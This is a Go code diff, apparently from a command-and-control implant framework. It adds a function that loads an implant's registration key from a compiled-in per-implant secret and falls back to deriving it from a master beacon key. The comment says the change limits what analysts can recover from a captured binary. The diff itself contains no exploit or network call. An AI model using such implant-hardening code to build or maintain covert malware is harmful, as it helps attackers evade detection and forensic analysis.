@@ -141,6 +141,20 @@ func deriveAgentRegKey(beaconKeyHex, agentID string) []byte {
 	return hkdfSHA256(master, []byte(regKeySaltV2), []byte(agentID))
 }
 
+// loadAgentRegKey returns the agent's registration key. v3: when a per-implant
+// registration secret was compiled in (RegSecretStr), it is used directly — the
+// fleet master beacon key is NOT present in the binary, so extracting it yields
+// nothing about any other implant. v2 legacy: derived from the compiled-in
+// master beacon key. Returns nil when neither is available.
+func loadAgentRegKey() []byte {
+	if RegSecretStr != "" {
+		if secret, err := base64.StdEncoding.DecodeString(RegSecretStr); err == nil && len(secret) == 32 {
+			return secret
+		}
+	}
+	return deriveAgentRegKey(beaconKey, agentUUID)
+}
+
 // deriveAgentSessionKey derives the AES-256-GCM session key from an X25519
 // shared secret. Mirrors crypto.DeriveSessionKey.
 func deriveAgentSessionKey(sharedSecret []byte, agentID string) []byte {
